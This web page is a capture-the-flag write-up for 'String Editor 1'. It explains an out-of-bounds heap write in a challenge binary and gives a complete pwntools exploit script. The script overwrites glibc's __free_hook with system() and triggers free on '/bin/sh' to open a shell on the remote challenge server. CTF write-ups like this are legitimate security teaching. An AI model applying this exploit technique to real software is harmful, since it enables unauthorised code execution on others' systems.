<div class="page-header">
    <div class="page-header-inner">
        <div class="page-header-inner2">
            <h1>String Editor 1 200pts</h1>
            <h2>July 2021</h2>
            <h4>Out of Bounds Free Hook Overwrite</h4>
        </div>
    </div>
</div>
<H4>Problem</H4>
<div class="paragraph">
    <p>
    Editing strings as a service? wow. <a href=../../docs/imaginary/string_editor1>string_editor1</a>
    <br>
    </p>
</div>
<H4>Solution</H4>
<div class="paragraph">
    <p>
    	This challenge gives us a binary to download and develop the exploit for locally, and then an address to connect to remotely and retrieve the flag from using the developed exploit. We also get a libc, so before starting the challenge we have to link the binary to the custom libc. 
        <br>
    	This challenge gives us an area of memory stored in the heap that we can manipulate one character at a time, similarly to pressing 'r' on vim when hovering over a character. Just in this case this is done via an index in the string, and there are no bound checks, so we can edit a byte anywhere in memory. Inputting 15 as the index instead calls free on the string. Additionally we are given both a heap leak and a libc leak. 
    	<br><br>
    </p>
</div>
<div>
    <img src="../imgs/imaginary/write_1a.png" alt="">
</div>

<div class="paragraph">
    <p>
        <br><br>
        To solve this challenge we simply have to calculate the distance between the given array and the free hook. We can then loop through and write the address of system() to the free hook 1 byte at a time. Now we just need to overwrite our string with '/bin/sh\0' and call free by inputting 15 which will result in system('/bin/sh') and spawn a shell. <br><br> The full exploit script is posted below. 
        <br><br>
    </p>
</div>
<div>
    <img src="../imgs/imaginary/write_1b.png" alt="">
</div>
<div>
    <style 
        type="text/css">
            pre code {
                      background-color: #008080;
                      border: 1px solid #999;
                      display: block;
                      padding: 15px;
                      color:  #F5F5DC;
                    }
    </style>
    <pre>
        <code>
#!/usr/bin/env python

from pwn import *
elf = context.binary = ELF('./vuln')
libc = elf.libc

local = False

if local:
    p = elf.process()
else:
    host = 'chal.imaginaryctf.org'
    port = 42004
    p = remote(host,port)


p.recvuntil('sponsors: ')
libc.address = int(p.recvline().strip(),16) - libc.sym.system
print(hex(libc.address))                    #Leak Libc Address

p.sendline('0')                             #Leak String Address
p.sendline('a')
p.recvuntil('DEBUG: ')
base = int(p.recvline().strip(),16)
print(hex(base))                                    

diff = libc.sym.__free_hook - base         #Calculate difference
system = p64(libc.sym.system)
binsh = '/bin/sh\0'

for c in system:
    p.sendline(str(diff))
    p.sendline(p8(c))
    diff +=1

i = 0
for c in binsh:
    p.sendline(str(i))
    p.sendline(c)
    i+=1

p.sendline('15')                            #System('/bin/sh')

p.interactive()

        </code>
    </pre>
</div>
<br><br>

<script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
